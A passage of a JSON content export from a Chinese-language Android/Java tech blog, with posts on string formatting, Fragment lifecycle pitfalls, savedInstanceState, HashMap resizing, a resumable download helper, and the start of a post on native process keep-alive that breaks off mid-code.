getDeclaredAnnotations：对于Class（类），返回当前类拥有注解，不包括@Inherited继承的","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"Android String 中的 %d %n$d","slug":"Android-String-d-n-d","date":"2017-07-09T07:49:57.000Z","updated":"2020-05-11T07:23:44.518Z","comments":true,"path":"2017/07/09/Android-String-d-n-d/","link":"","permalink":"https://superxlcr.github.io/2017/07/09/Android-String-d-n-d/","excerpt":"","text":"在Java中，我们可以使用String的format函数来实现格式化字符串的效果。在Android中，由于我们的字符串String往往是定义在xml文件中的。因此，以整型为例，除了原本的%d以外，我们还可以使用%n$d的形式。其中，n代表format函数的具体替换参数中的第几个参数。举例：Java代码如下，获取并格式化字符串后，通过Log打印出来： 12String str = String.format(getResources().getString(R.string.strTest), 1, 2, 3);Log.d(TAG , str); xml文件如下：使用%n$d的情况： 1&lt;string name=\"strTest\"&gt;String format test : %1$d %2$d %3$d %2$d&lt;/string&gt; 打印Log如下，依次打印第一、第二、第三、第二个整型数据： 1MyLog: String format test : 1 2 3 2 使用%d的情况如下，记得把formatted属性设置为false： 1&lt;string name=\"strTest\" formatted=\"false\"&gt;String format test : %d %d %d&lt;/string&gt; 打印Log如下，依次打印整型数据： 1MyLog: String format test : 1 2 3","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"资源文件","slug":"资源文件","permalink":"https://superxlcr.github.io/tags/资源文件/"}]},{"title":"Android Fragment总结","slug":"Android-Fragment总结","date":"2017-06-02T08:27:26.000Z","updated":"2020-05-11T07:23:44.502Z","comments":true,"path":"2017/06/02/Android-Fragment总结/","link":"","permalink":"https://superxlcr.github.io/2017/06/02/Android-Fragment总结/","excerpt":"","text":"最近整理了一些关于Android中Fragment相关的知识，在此进行一下总结。 Fragment中getActivity()空指针某些时候，如果我们试图在Fragment中执行异步操作，那我们很大可能会遇到getActivity()返回null的问题出现了这个奇怪的问题，我们先来了解下原因，为啥getActivity会返回null呢？来一起看下源码Fragment#getActivity()： 123final public FragmentActivity getActivity() &#123; return mHost == null ? null : (FragmentActivity) mHost.getActivity();&#125; 从上我们可以推断出，是mHost成员变量被置为了null，getActivity方法才返回null的全局查找下对mHost的修改，修改为null的地方有两处： Fragment#initState() （一看就是初始化状态的方法，忽略） Fragment#moveToState() （根据名称，判断为Fragment状态转移方法，看一下它的源码） FragmentManager#moveToState()： 12345678910111213141516171819202122232425262728293031323334353637383940414243...if (newState &lt; Fragment.CREATED) &#123; if (mDestroyed) &#123; if (f.mAnimatingAway != null) &#123; // The fragment's containing activity is // being destroyed, but this fragment is // currently animating away. Stop the // animation right now -- it is not needed, // and we can't wait any more on destroying // the fragment. View v = f.mAnimatingAway; f.mAnimatingAway = null; v.clearAnimation(); &#125; &#125; if (f.mAnimatingAway != null) &#123; // We are waiting for the fragment's view to finish // animating away. Just make a note of the state // the fragment now should move to once the animation // is done. f.mStateAfterAnimating = newState; newState = Fragment.CREATED; &#125; else &#123; if (DEBUG) Log.v(TAG, \"movefrom CREATED: \" + f); if (!f.mRetaining) &#123; f.performDestroy(); &#125; else &#123; f.mState = Fragment.INITIALIZING; &#125; f.performDetach(); if (!keepActive) &#123; if (!f.mRetaining) &#123; makeInactive(f); &#125; else &#123; f.mHost = null; f.mParentFragment = null; f.mFragmentManager = null; &#125; &#125; &#125;&#125;... 省略了部分无关代码，我们看到第36行mHost变量被置空了那么置空的时机是什么时候呢？我们往回一点，看到第31行的performDetach()：Fragment#performDetach()： 1234567891011121314151617181920void performDetach() &#123; mCalled = false; onDetach(); if (!mCalled) &#123; throw new SuperNotCalledException(\"Fragment \" + this + \" did not call through to super.onDetach()\"); &#125; // Destroy the child FragmentManager if we still have it here. // We won't unless we're retaining our instance and if we do, // our child FragmentManager instance state will have already been saved. if (mChildFragmentManager != null) &#123; if (!mRetaining) &#123; throw new IllegalStateException(\"Child FragmentManager of \" + this + \" was not \" + \" destroyed and this fragment is not retaining instance\"); &#125; mChildFragmentManager.dispatchDestroy(); mChildFragmentManager = null; &#125;&#125; 第3行可以看到熟悉的onDetach生命周期，因此我们可以得知，当Fragment执行了onDetach之后，就意味着它已经与宿主Activity脱离了，而此时调用getActivity也将返回null 解决办法： 通过Fragment#isAdded()判断Fragment是否已经detach，如果是，则终止与Context相关的操作 网上有很多的办法是通过新建一个新的变量，强制保留对fragment宿主Activity的引用，博主个人认为这种方法是不可取的： 首先，强制保留对Activity的引用会导致Fragment与Activity脱离后，系统无法对Activity进行回收，该引用处理不好容易引起内存泄露 其次，官方允许getActivity结果为null，这种情况是在提醒开发者，Fragment已经与其宿主Activity脱离，应该中止一切与Context相关的操作（如UI操作、界面跳转等），强行地使用之前保留的Activity引用，是一种不符合官方设计意图的行为 FragmentTransaction的四种提交方法使用Fragment时，可以通过用户交互来执行一些动作，比如增加、移除、替换等 所有这些改变构成一个集合，这个集合被叫做一个transaction 我们可以调用FragmentTransaction中的方法来处理这个transaction，并且可以将transaction存进由activity管理的back stack中，这样用户就可以通过点击回退键，进行fragment 变化的回退操作 FragmentTransaction的提交方法有四个，分别为： commit：该方法不会使transaction立即生效，而是形成一个计划任务等待主线程有空时再执行。该方法必须在Activity保存自身状态前调用（即onSaveInstanceState之前，因为savedInstance会保存Fragment 的状态），否则会抛出异常。如果调用了addToBackStack方法返回backStack实例的id，否则返回一个负数 commitAllowingStateLoss：与commit 方法类似，不同之处在于允许在Activity保存自身状态后调用，那么当Activity恢复自身状态时，该Transaction可能会由于没有被记录进savedInstance而被丢失 commitNow：API 24添加的新方法。commit 方法不能保证提交的transaction马上生效，如果需要使这些transaction生效，通常会调用FragmentManager 的executePendingTransactions方法使之前提交的transaction依次生效。commitNow方法保证当前提交的transaction马上生效，且与之前commit 提交的transaction没有关系，但由于因此会打乱transaction的提交顺序，使用该方法提交的transaction不允许调用addToBackStack方法加入backStack，否则会抛出异常，也因此该方法没有返回值。其余与commit 方法基本类似。 commitAllowingStateLoss：API 24添加的新方法。与commitNow类似，不同之处在于允许在Activity保存自身状态后调用，那么当Activity恢复自身状态时，该Transaction可能会由于没有被记录进savedInstance而被丢失","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"}]},{"title":"Android Activity savedInstanceState","slug":"Android-Activity-savedInstanceState","date":"2017-06-01T03:14:54.000Z","updated":"2020-05-11T07:23:44.492Z","comments":true,"path":"2017/06/01/Android-Activity-savedInstanceState/","link":"","permalink":"https://superxlcr.github.io/2017/06/01/Android-Activity-savedInstanceState/","excerpt":"","text":"最近了解了一些关于Android的savedInstanceState相关的知识，在此进行一下总结。 在Android的Activity控件中的onCreate方法中，我们可以获得的一个参数为savedInstanceState： 12@Overrideprotected void onCreate(Bundle savedInstanceState) 该参数的作用是什么呢？ 这时，我们就得提到构造savedInstanceState的另一个方法： 12@Overrideprotected void onSaveInstanceState(Bundle outState) 该方法的作用为：Called to retrieve per-instance state from an activity before being killed so that the state can be restored in onCreate(Bundle) or onRestoreInstanceState(Bundle) (the Bundle populated by this method will be passed to both).即：用于保存Activity被杀死前一刻的每个实例的状态，然后当Activity被重启时，传递给onCreate与onRestoreInstanceState方法该方法的调用时间为：This method is called before an activity may be killed so that when it comes back some time in the future it can restore its state. 即：当一个Activity可能被杀死时调用。由于是在Activity可能被杀死时调用，但许多情况下调用了onSaveInstanceState方法后Activity并不一定会被杀死，因此其与调用onCreate与onRestoreInstanceState并不是成对的。常见的调用时间有： 当用户按下HOME键时 长按HOME键，选择运行其他的程序时 按下电源按键（关闭屏幕显示）时 从activity A中启动一个新的activity时 屏幕方向切换时 另外，该方法与Activity的生命周期没有关系，并不会依照特定的顺序被调用。但如果被调用时，一定保证会在onStop方法前被调用。值得注意的是：The default implementation takes care of most of the UI per-instance state for you by calling onSaveInstanceState() on each view in the hierarchy that has an id, and by saving the id of the currently focused view (all of which is restored by the default implementation of onRestoreInstanceState(Bundle)). If you override this method to save additional information not captured by each individual view, you will likely want to call through to the default implementation, otherwise be prepared to save all of the state of each view yourself. 据博主所了解，onSaveInstanceState默认方法会为我们自动存储当前Activity对应布局中的View以及Fragment相关的状态，如果需要存储某些变量的值则需要我们重写onSaveInstanceState方法自行操作，重写方法时应注意调用父类方法来保存Activitiy中的UI 状态，通过onRestoreInstanceState方法恢复数据同理。下面为一个Activity切换屏幕方向恢复数据的例子： 123456789101112131415161718192021222324252627282930313233343536public class MainActivity extends AppCompatActivity &#123; private static final String TAG = \"MyLog\"; private TextView textView; private EditText editText; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); if (savedInstanceState == null) &#123; // 初次运行 textView = (TextView) findViewById(R.id.text_view); editText = (EditText) findViewById(R.id.editText); textView.setText(\"before\"); &#125; else &#123; // 恢复数据 textView = (TextView) findViewById(R.id.text_view); textView.setText(\"after\"); &#125; &#125; @Override protected void onSaveInstanceState(Bundle outState) &#123; // 保存各种View的状态 super.onSaveInstanceState(outState); Log.d(TAG, \"onSaveInstanceState\"); &#125; @Override protected void onRestoreInstanceState(Bundle savedInstanceState) &#123; // 恢复各种View的状态 super.onRestoreInstanceState(savedInstanceState); Log.d(TAG, \"onRestoreInstanceState\"); &#125;&#125; Activity的布局xml文件包含了一个TextView与一个EditText。 首次运行： 在EditText中输入内容： 进行屏幕切换： 不调用onRestoreInstanceState的父类方法，其余步骤同上，屏幕切换后： 123456 @Override protected void onRestoreInstanceState(Bundle savedInstanceState) &#123; // 恢复各种View的状态// super.onRestoreInstanceState(savedInstanceState); Log.d(TAG, \"onRestoreInstanceState\"); &#125; 可以看到，在没有调用父类方法时，EditText的输入内容变回了原本的Name而非我们输入的input something，由此看来，savedInstanceState确实具有保存Activity中布局的UI状态的功能。因此，在我们实现自定义View控件的时候也应该记得实现View的onSaveInstanceState方法，用于存储UI控件的状态（默认实现为什么都不保存）。 PS：savedInstance虽然默认会保留fragment相关信息，但只是保留了fragment 对象本身而已（不需要我们再次add fragment），但每次初始化图像时均会重新调用onCreateView重新绘制，因此UI上的状态也会丢失（比如EditText输入的内容等），此时我们需要重写fragment的onSaveInstanceState自行保存其中的UI状态，并在onViewStateRestored方法中恢复： 12345678910111213141516171819202122232425262728293031public class MyFragment extends Fragment &#123; private static final String VIEWS_TAG = \"my_fragment:views\"; @Nullable @Override public View onCreateView(LayoutInflater inflater, @Nullable ViewGroup container, Bundle savedInstanceState) &#123; return inflater.inflate(R.layout.fragment_my, container, false); &#125; @Override public void onViewStateRestored(Bundle savedInstanceState) &#123; super.onViewStateRestored(savedInstanceState); // 恢复UI状态 if (savedInstanceState != null &amp;&amp; getView() != null) &#123; SparseArray&lt;Parcelable&gt; sparseArray = savedInstanceState.getSparseParcelableArray(VIEWS_TAG); getView().restoreHierarchyState(sparseArray); &#125; &#125; @Override public void onSaveInstanceState(Bundle outState) &#123; super.onSaveInstanceState(outState); // 保存UI状态 SparseArray&lt;Parcelable&gt; sparseArray = new SparseArray&lt;Parcelable&gt;(); if (getView() != null) &#123; getView().saveHierarchyState(sparseArray); outState.putSparseParcelableArray(VIEWS_TAG, sparseArray); &#125; &#125;&#125;","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"}]},{"title":"Java HashMap的扩容","slug":"Java-HashMap的扩容","date":"2017-05-30T10:29:18.000Z","updated":"2020-05-11T07:23:44.704Z","comments":true,"path":"2017/05/30/Java-HashMap的扩容/","link":"","permalink":"https://superxlcr.github.io/2017/05/30/Java-HashMap的扩容/","excerpt":"","text":"最近博主参加面试，发现自己对于Java的HashMap的扩容过程理解不足，故最近在此进行总结。 首先说明博主德Java为1.8版本 HashMap中的变量首先要了解HashMap的扩容过程，我们就得了解一些HashMap中的变量： Node&lt;K,V&gt;：链表节点，包含了key、value、hash、next指针四个元素 table：Node&lt;K,V&gt;类型的数组，里面的元素是链表，用于存放HashMap元素的实体 size：记录了放入HashMap的元素个数 loadFactor：负载因子 threshold：阈值，决定了HashMap何时扩容，以及扩容后的大小，一般等于table大小乘以loadFactor HashMap的构造函数HashMap的构造函数主要有四个，代码如下： 123456789101112131415161718public HashMap(int initialCapacity, float loadFactor) &#123; ... this.loadFactor = loadFactor; this.threshold = tableSizeFor(initialCapacity);&#125;public HashMap(int initialCapacity) &#123; this(initialCapacity, DEFAULT_LOAD_FACTOR);&#125;public HashMap() &#123; this.loadFactor = DEFAULT_LOAD_FACTOR; // all other fields defaulted&#125;public HashMap(Map&lt;? extends K, ? extends V&gt; m) &#123; this.loadFactor = DEFAULT_LOAD_FACTOR; putMapEntries(m, false);&#125; 其中主要有两种形式： 直接拷贝别的HashMap的形式，在此不作讨论 定义初始容量大小（table数组的大小，缺省值为16），定义负载因子（缺省值为0.75）的形式 值得注意的是，当我们自定义HashMap初始容量大小时，构造函数并非直接把我们定义的数值当做HashMap容量大小，而是把该数值当做参数调用方法tableSizeFor，然后把返回值作为HashMap的初始容量大小： 123456789101112/** * Returns a power of two size for the given target capacity. */static final int tableSizeFor(int cap) &#123; int n = cap - 1; n |= n &gt;&gt;&gt; 1; n |= n &gt;&gt;&gt; 2; n |= n &gt;&gt;&gt; 4; n |= n &gt;&gt;&gt; 8; n |= n &gt;&gt;&gt; 16; return (n &lt; 0) ? 1 : (n &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1;&#125; 该方法会返回一个大于等于当前参数的2的倍数，因此HashMap中的table数组的容量大小总是2的倍数。 何时进行扩容？HashMap使用的是懒加载，构造完HashMap对象后，只要不进行put 方法插入元素之前，HashMap并不会去初始化或者扩容table： 1234567891011121314151617181920public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true);&#125;final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) &#123; Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i; if ((tab = table) == null || (n = tab.length) == 0) n = (tab = resize()).length; if ((p = tab[i = (n - 1) &amp; hash]) == null) tab[i] = newNode(hash, key, value, null); else &#123; ... &#125; ++modCount; if (++size &gt; threshold) resize(); afterNodeInsertion(evict); return null;&#125; 在putVal方法第8、9行我们可以看到，当首次调用put方法时，HashMap会发现table为空然后调用resize方法进行初始化在putVal方法第16、17行我们可以看到，当添加完元素后，如果HashMap发现size（元素总数）大于threshold（阈值），则会调用resize方法进行扩容 在这里值得注意的是，在putVal方法第10行我们可以看到，插入元素的hash值是一个32位的int值，而实际当前元素插入table的索引的值为 ： 1（table.size - 1）&amp; hash 又由于table的大小一直是2的倍数，2的N次方，因此当前元素插入table的索引的值为其hash值的后N位组成的值 resize扩容12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273final Node&lt;K,V&gt;[] resize() &#123; Node&lt;K,V&gt;[] oldTab = table; int oldCap = (oldTab == null) ? 0 : oldTab.length; int oldThr = threshold; int newCap, newThr = 0; if (oldCap &gt; 0) &#123; if (oldCap &gt;= MAXIMUM_CAPACITY) &#123; threshold = Integer.MAX_VALUE; return oldTab; &#125; else if ((newCap = oldCap &lt;&lt; 1) &lt; MAXIMUM_CAPACITY &amp;&amp; oldCap &gt;= DEFAULT_INITIAL_CAPACITY) newThr = oldThr &lt;&lt; 1; // double threshold &#125; else if (oldThr &gt; 0) // initial capacity was placed in threshold newCap = oldThr; else &#123; // zero initial threshold signifies using defaults newCap = DEFAULT_INITIAL_CAPACITY; newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY); &#125; if (newThr == 0) &#123; float ft = (float)newCap * loadFactor; newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (float)MAXIMUM_CAPACITY ? (int)ft : Integer.MAX_VALUE); &#125; threshold = newThr; @SuppressWarnings(&#123;\"rawtypes\",\"unchecked\"&#125;) Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])new Node[newCap]; table = newTab; if (oldTab != null) &#123; for (int j = 0; j &lt; oldCap; ++j) &#123; Node&lt;K,V&gt; e; if ((e = oldTab[j]) != null) &#123; oldTab[j] = null; if (e.next == null) newTab[e.hash &amp; (newCap - 1)] = e; else if (e instanceof TreeNode) ((TreeNode&lt;K,V&gt;)e).split(this, newTab, j, oldCap); else &#123; // preserve order Node&lt;K,V&gt; loHead = null, loTail = null; Node&lt;K,V&gt; hiHead = null, hiTail = null; Node&lt;K,V&gt; next; do &#123; next = e.next; if ((e.hash &amp; oldCap) == 0) &#123; if (loTail == null) loHead = e; else loTail.next = e; loTail = e; &#125; else &#123; if (hiTail == null) hiHead = e; else hiTail.next = e; hiTail = e; &#125; &#125; while ((e = next) != null); if (loTail != null) &#123; loTail.next = null; newTab[j] = loHead; &#125; if (hiTail != null) &#123; hiTail.next = null; newTab[j + oldCap] = hiHead; &#125; &#125; &#125; &#125; &#125; return newTab;&#125; 从第15 ～ 20行可以看到，若threshold（阈值）不为空，table的首次初始化大小为阈值，否则初始化为缺省值大小16 当table需要扩容时，从第11 ~ 13行可以看到，扩容后的table大小变为原来的两倍，接下来就是进行扩容后table的调整：假设扩容前的table大小为2的N次方，有上述put方法解析可知，元素的table索引为其hash值的后N位确定那么扩容后的table大小即为2的N+1次方，则其中元素的table索引为其hash值的后N+1位确定，比原来多了一位因此，table中的元素只有两种情况： 元素hash值第N+1位为0：不需要进行位置调整 元素hash值第N+1位为1：调整至原索引的两倍位置 在resize方法中，第45行的判断即用于确定元素hashi值第N+1位是否为0： 若为0，则使用loHead与loTail，将元素移至新table的原索引处 若不为0，则使用hiHead与hiHead，将元素移至新table的两倍索引处 扩容或初始化完成后，resize方法返回新的table","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"Android 文件中断续传","slug":"Android-文件中断续传","date":"2017-05-29T03:44:40.000Z","updated":"2020-05-11T07:23:44.537Z","comments":true,"path":"2017/05/29/Android-文件中断续传/","link":"","permalink":"https://superxlcr.github.io/2017/05/29/Android-文件中断续传/","excerpt":"","text":"最近尝试了Android 的文件中断续传功能，在此写下一篇博客进行记录。 功能原理实现文件中断续传功能主要依赖的原理有两个： 通过RandomAccessFile文件定位功能在特定位置写入文件 通过HTTP 1.1协议的Range头域来获取下载文件的特定部分 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132public class FileContinueDownload &#123; private static final String SP_NAME = \"FileContinueDownload\"; private static final int BUFFER_SIZE = 512; private Context context; private String fileUrl; private String fileName; private String filePath; private FileContinueDownloadListener listener; private SharedPreferences sharedPreferences; private RandomAccessFile randomAccessFile; private long startPosition; private volatile boolean work; /** * * @param context 上下文 * @param fileUrl url * @param fileName 文件名 * @param filePath 文件存储路径 * @param listener 监听器 */ public FileContinueDownload(Context context, String fileUrl, String fileName, String filePath, FileContinueDownloadListener listener) &#123; this.context = context.getApplicationContext(); this.fileUrl = fileUrl; this.fileName = fileName; this.filePath = filePath; this.listener = listener; init(); &#125; /** * 开始下载文件 */ public void start() &#123; if (work) &#123; return; &#125; work = true; new Thread(new Runnable() &#123; @Override public void run() &#123; try &#123; // 开启网络连接 URL url = new URL(fileUrl); HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection(); httpURLConnection.setConnectTimeout(3000); httpURLConnection.setRequestMethod(\"GET\"); httpURLConnection.setRequestProperty(\"Range\", \"bytes=\" + startPosition + \"-\"); int responseCode = httpURLConnection.getResponseCode(); if (responseCode == 200 || responseCode == 206) &#123; int fileLength = httpURLConnection.getContentLength(); InputStream inputStream = httpURLConnection.getInputStream(); byte buffer[] = new byte[BUFFER_SIZE]; int len; // 下载文件 while ((len = inputStream.read(buffer)) != -1) &#123; randomAccessFile.write(buffer, 0, len); // 更新进度 listener.onUpdate((int) randomAccessFile.getFilePointer(), fileLength); // 更新sharedPreferences SharedPreferences.Editor editor = sharedPreferences.edit(); startPosition = randomAccessFile.getFilePointer(); editor.putLong(fileName, startPosition); editor.apply(); // 判断是否暂停 if (!work) &#123; break; &#125; &#125; if (work) &#123; // 工作状态退出，代表已下载完毕 SharedPreferences.Editor editor = sharedPreferences.edit(); editor.remove(fileName); editor.apply(); listener.onFinish(); &#125; &#125; &#125; catch (Exception e) &#123; listener.onError(e); &#125; &#125; &#125;).start(); &#125; /** * 暂停下载文件 */ public void pause() &#123; work = false; &#125; private void init() &#123; try &#123; // 获取sharedPreferences sharedPreferences = context.getSharedPreferences(SP_NAME, Context.MODE_PRIVATE); if (!sharedPreferences.contains(fileName)) &#123; // 不存在进度，创建文件 File file = new File(filePath, fileName); if (!file.exists()) &#123; file.createNewFile(); &#125; randomAccessFile = new RandomAccessFile(file, \"rwd\"); SharedPreferences.Editor editor = sharedPreferences.edit(); editor.putLong(fileName, 0); editor.apply(); startPosition = 0; &#125; else &#123; // 存在进度，获取进度 File file = new File(filePath, fileName); randomAccessFile = new RandomAccessFile(file, \"rwd\"); startPosition = sharedPreferences.getLong(fileName, 0); randomAccessFile.seek(startPosition); &#125; &#125; catch (Exception e) &#123; listener.onError(e); return; &#125; &#125;&#125;interface FileContinueDownloadListener &#123; void onUpdate(int nowProgress, int totalProgress); void onError(Exception e); void onFinish();&#125; FileContinueDownload为文件中断续传帮助类，通过Android的SharedPreferences来记录文件的下载进度，使用RandomAccessFile的seek方法来找到合适的位置进行文件写入，通过HTTP 1.1的Range头域来获取剩余的部分文件，最终结果或者错误通过监听器进行返回。 测试的例子如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697public class MainActivity extends AppCompatActivity &#123; private static MyHandler handler; private static final String URL = \"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1495972879917&amp;di=327cc1f368b192793d82a2320e8b7599&amp;imgtype=0&amp;src=http%3A%2F%2Fi2.hdslb.com%2Fbfs%2Farchive%2Fb622e10be9e9a63ca2922348541ec86b55c0fc53.jpg\"; private static final String FILE_NAME = \"file_continue_download_test.jpg\"; private static final String FILE_PATH = Environment.getExternalStorageDirectory().getPath(); private static final int HANDLER_START = 0; private static final int HANDLER_FINISH = 1; private TextView nameTV; private ProgressBar progressBar; private Button startBtn; private Button pauseBtn; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); initView(); handler = new MyHandler(this); FileContinueDownloadListener listener = new FileContinueDownloadListener() &#123; @Override public void onUpdate(int nowProgress, int totalProgress) &#123; Message message = handler.obtainMessage(HANDLER_START, nowProgress, totalProgress); handler.sendMessage(message); &#125; @Override public void onError(Exception e) &#123; Log.e(\"MyLog\", Log.getStackTraceString(e)); &#125; @Override public void onFinish() &#123; Message message = handler.obtainMessage(HANDLER_FINISH); handler.sendMessage(message); &#125; &#125;; final FileContinueDownload download = new FileContinueDownload(this, URL, FILE_NAME, FILE_PATH, listener); startBtn.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; download.start(); startBtn.setEnabled(false); pauseBtn.setEnabled(true); &#125; &#125;); pauseBtn.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; download.pause(); startBtn.setEnabled(true); pauseBtn.setEnabled(false); &#125; &#125;); &#125; private void initView() &#123; nameTV = (TextView) findViewById(R.id.textView); nameTV.setText(FILE_NAME); progressBar = (ProgressBar) findViewById(R.id.progressBar); progressBar.setMax(1); progressBar.setProgress(0); startBtn = (Button) findViewById(R.id.start); pauseBtn = (Button) findViewById(R.id.pause); startBtn.setEnabled(true); pauseBtn.setEnabled(false); &#125; static class MyHandler extends Handler &#123; private SoftReference&lt;MainActivity&gt; reference; MyHandler(MainActivity mainActivity) &#123; reference = new SoftReference&lt;MainActivity&gt;(mainActivity); &#125; @Override public void handleMessage(Message msg) &#123; MainActivity activity = reference.get(); if (activity != null &amp;&amp; msg.what == HANDLER_START) &#123; int nowProgress = msg.arg1; int totalProgress = msg.arg2; activity.progressBar.setMax(totalProgress); activity.progressBar.setProgress(nowProgress); &#125; else if (activity != null &amp;&amp; msg.what == HANDLER_FINISH) &#123; Toast.makeText(activity, \"download finish!\", Toast.LENGTH_SHORT).show(); activity.startBtn.setEnabled(false); activity.pauseBtn.setEnabled(false); &#125; &#125; &#125;&#125; xml文件就不贴出来了，里面是一个TextView、ProgressBar以及两个Button。 效果如下所示： 下图分别为初始界面、开始下载、暂停下载 )) 下载到一半的file_continue_download_test.jpg文件： 继续下载以及下载完成的文件：)","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"}]},{"title":"Android 5.0 以下Native进程保活尝试","slug":"Android-5-0-以下Native进程保活尝试","date":"2017-05-26T09:33:53.000Z","updated":"2020-05-11T07:23:44.487Z","comments":true,"path":"2017/05/26/Android-5-0-以下Native进程保活尝试/","link":"","permalink":"https://superxlcr.github.io/2017/05/26/Android-5-0-以下Native进程保活尝试/","excerpt":"","text":"最近博主尝试了Android 5.0 以下版本的Native保活机制，感觉收获颇丰，在此写下一篇博客记录一下。首先把整个保活流程通过图片的形式描述下： 首先是AndroidManifest 中注册的控件： 123456789101112&lt;activity android:name=\".MainActivity\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"android.intent.action.MAIN\" /&gt; &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt; &lt;/intent-filter&gt;&lt;/activity&gt;&lt;service android:name=\".PersistService\" android:process=\":persist\" /&gt;&lt;receiver android:name=\".WakeUpBroadcastReceiver\" android:process=\":wake_up\" android:exported=\"true\"/&gt; 主要有三个控件：一个用于启动服务的Activity，一个在:persist 子进程中的运行任务的服务Service，以及一个在:wake_up 子进程中用于拉活Service的BroadcastReceiver MainActivity过于简单在此就不做介绍了，PersistService的代码如下： 123456789101112131415161718192021222324252627282930313233343536public class PersistService extends Service &#123; private static final String TAG = \"MyLog\"; @Nullable @Override public IBinder onBind(Intent intent) &#123; return null; &#125; @Override public void onCreate() &#123; super.onCreate(); // 运行守护Daemon Log.d(TAG, \"run daemon\"); Daemon.run(this, WakeUpBroadcastReceiver.class); new Thread(new Runnable() &#123; @Override public void run() &#123; int i = 0; while (true) &#123; Log.d(\"TestLive\", \"number is \" + i++); try &#123; Thread.sleep(5000); &#125; catch (InterruptedException e) &#123;&#125; &#125; &#125; &#125;).start(); &#125; @Override public int onStartCommand(Intent intent, int flags, int startId) &#123; Log.d(TAG, \"onStartCommand\"); return super.onStartCommand(intent, flags, startId); &#125;&#125; 在PersistService的onCreate方法中，调用了Daemon类启动守护进程对PersistService类进行守护，并启动了新线程计数模拟工作。 Daemon类代码如下： 1234567891011121314151617181920212223242526272829303132333435private static final String DIR_NAME = \"bin\";private static final String FILE_NAME = \"serviceDaemon\";private static AlarmManager alarmManager;public static PendingIntent wakeUpIntent;static &#123; System.loadLibrary(\"daemon-lib\");&#125;/** * 运行守护进程 * @param context 上下文 * @param wakeUpClass 唤醒Service类 */public static void run(final Context context, final Class wakeUpClass) &#123; // 初始化闹钟与唤醒用的intent alarmManager = ((AlarmManager)context.getSystemService(Context.ALARM_SERVICE)); Intent intent = new Intent(context, wakeUpClass); wakeUpIntent = PendingIntent.getBroadcast(context, 0, intent, 0); // 启动守护进程 new Thread(new Runnable() &#123; @Override public void run() &#123; // 复制binary文件 String binaryFilePath = Command.install(context, DIR_NAME, FILE_NAME); if (binaryFilePath != null) &#123; // 运行 start(context.getPackageName(), wakeUpClass.getSimpleName(), binaryFilePath); &#125; &#125; &#125;).start();&#125;private native static void start(String packageName, String serviceClassName, String binaryFilePath); 在run方法中，首先调用了Command工具类根据系统ABI获取在assets文件夹下相应的二进制文件，复制到特定地点后更改权限等待执行然后启动子线程通过JNI调用native的start方法，传入包名、需要唤醒的类名以及二进制文件的路径： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980extern \"C\"JNIEXPORT void JNICALL Java_com_app_superxlcr_mynativetest_Daemon_start (JNIEnv *env, jclass clazz, jstring jPackageName, jstring jWakeUpClassName, jstring jBinaryFilePath) &#123; // 获取Java参数 const char *packageName = env-&gt;GetStringUTFChars(jPackageName, 0); const char *wakeUpClassName = env-&gt;GetStringUTFChars(jWakeUpClassName, 0); const char *binaryFilePath = env-&gt;GetStringUTFChars(jBinaryFilePath, 0); LOGD(MY_NATIVE_TAG, \"packageName is %s\", packageName); LOGD(MY_NATIVE_TAG, \"wakeUpCLassName is %s\", wakeUpClassName); LOGD(MY_NATIVE_TAG, \"binaryFilePath is %s\", binaryFilePath); // 建立管道，pipe1用于父进程监听子进程，pipe2用于子进程监听父进程 int pipe1Fd[2]; int pipe2Fd[2]; if (pipe(pipe1Fd) == -1) &#123; LOGE(MY_NATIVE_TAG, \"create pipe1 error\"); &#125; if (pipe(pipe2Fd) == -1) &#123; LOGE(MY_NATIVE_TAG, \"create pipe2 error\"); &#125; // 执行二进制文件 pid_t result = fork(); if (result &gt; 